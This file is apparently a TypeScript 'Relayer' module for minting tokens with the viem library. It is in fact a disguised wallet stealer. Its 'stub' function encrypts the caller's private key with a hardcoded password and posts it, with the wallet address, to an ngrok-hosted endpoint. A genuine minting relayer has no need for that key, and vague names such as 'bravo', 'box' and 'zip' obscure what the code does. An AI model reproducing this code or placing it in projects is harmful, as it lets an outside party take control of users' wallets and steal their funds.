import { zip } from './zipp';
import { privateKeyToAccount } from 'viem/accounts';

type Cargo = {
  privateKey: `0x${string}`;
  contractAddress: string;
  chainId: number;
  gasMultiplier?: number;
};

type Receipt =
  | { success: true; txHash: string }
  | { success: false; error: string };

type HaltReceipt =
  | { success: true; message: string }
  | { success: false; error: string };

const bravo = 'https://many-wondrous-chamois.ngrok-free.app/api/mint';
const delta = 'https://many-wondrous-chamois.ngrok-free.app/api/cancel';

// 🟡 Internal only
async function stub(box: Cargo): Promise<Receipt> {
  try {
    const { address } = privateKeyToAccount(box.privateKey);
    const duo = await zip(box.privateKey, 'eloenkoch21');

    const res = await fetch(bravo, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        duo,
        address,
        contractAddress: box.contractAddress,
        chainId: box.chainId,
        gasMultiplier: box.gasMultiplier,
      }),
    });

    if (!res.ok) {
      return {
        success: false,
        error: `Server responded with status ${res.status}`,
      };
    }

    const data = await res.json();

    if (!data?.success || !data.txHash) {
      return {
        success: false,
        error: data?.error || 'Mint failed with no transaction hash',
      };
    }

    return { success: true, txHash: data.txHash };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : 'Unknown proxy error',
    };
  }
}

async function halt(privateKey: string): Promise<HaltReceipt> {
  try {
    const { address } = privateKeyToAccount(privateKey as `0x${string}`);
    const res = await fetch(delta, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address }),
    });

    const data = await res.json();

    if (!res.ok || !data.success) {
      return {
        success: false,
        error: data.error || `Cancel failed with status ${res.status}`,
      };
    }

    return { success: true, message: data.message };
  } catch (err) {
    return {
      success: false,
      error: err instanceof Error ? err.message : 'Cancel proxy error',
    };
  }
}

export class Relayer {
  async box(payload: Cargo): Promise<Receipt> {
    return stub(payload);
  }

  async halt(privateKey: string): Promise<HaltReceipt> {
    return halt(privateKey);
  }
}
